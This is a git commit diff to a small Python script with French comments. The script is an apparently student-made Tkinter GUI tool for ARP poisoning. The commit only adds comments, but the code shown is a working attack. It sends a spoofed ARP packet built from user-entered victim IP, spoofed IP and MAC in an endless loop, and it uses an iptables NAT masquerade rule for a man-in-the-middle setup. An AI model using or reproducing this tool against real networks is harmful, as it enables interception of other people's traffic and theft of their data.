16e5d357cf64500bfb87c434db5e8ba684385bf7
VayanHeim <vianney.th@gmail.com>
2016-02-12 14:37:35 +0100

    Update Vianney-Sandrine.py

--- Vianney-Sandrine.py
+++ Vianney-Sandrine.py
@@ -17,7 +17,7 @@ os.system("iptables -t nat --append POSTROUTING --out-interface eth0 -j MASQUERA
 def arp_poisonning():
 	op=1 #envoie un packet a la fois
 	
-	arp=ARP(op=op,psrc=spoof.get(),pdst=victim.get(),hwdst=mac.get()) #lance larp poisonning
+	arp=ARP(op=op,psrc=spoof.get(),pdst=victim.get(),hwdst=mac.get()) #recupere les infos des formulaire et lance larp poisonning 
 	
 	while 1: #boucle
 		send(arp) #envoyer larp poisonning
@@ -27,12 +27,12 @@ def arp_poisonning():
 master = Tk()
 master.title('ARP Poisonning') # donner un nom a la fenetre
 
-#
+#texte devant formulaire
 Label(master, text="Entrez l'adresse IP de la victime: ").grid(row=0)
 Label(master, text="Entrez l'adresse IP a usurper: ").grid(row=1)
 Label(master, text="Entrez l adresse MAC a associer: ").grid(row=2)
 
-#
+#formulaire
 victim = Entry(master)
 spoof = Entry(master)
 mac = Entry(master)
@@ -42,12 +42,11 @@ victim.grid(row=0, column=1)
 spoof.grid(row=1, column=1)
 mac.grid(row=2, column=1)
 
-
 #creation des boutons
 Button(master, text='Executer', command=arp_poisonning).grid(row=3, column=0, sticky=W, pady=4)
 Button(master, text='Quitter', command=master.destroy).grid(row=3, column=1, sticky=W, pady=4)
 
-
+#fin de la fenetre
 master.mainloop()
 
 #demande les informations
